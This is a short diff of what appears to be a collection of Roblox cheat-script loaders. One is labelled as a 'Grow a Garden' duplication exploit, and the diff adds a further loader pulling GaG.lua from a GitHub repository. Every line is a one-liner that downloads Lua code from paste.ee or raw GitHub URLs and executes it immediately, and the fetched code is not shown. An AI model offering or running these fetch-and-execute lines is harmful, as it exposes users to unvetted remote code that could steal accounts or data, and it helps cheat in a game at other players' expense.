@@ -9,3 +9,5 @@ loadstring(game:HttpGet("https://paste.ee/r/eTCCYqn9"))()
 @growagardendupe: loadstring(game:HttpGet("https://paste.ee/r/GvjPrxEd"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kosowa/asd/refs/heads/main/GaG.lua"))()
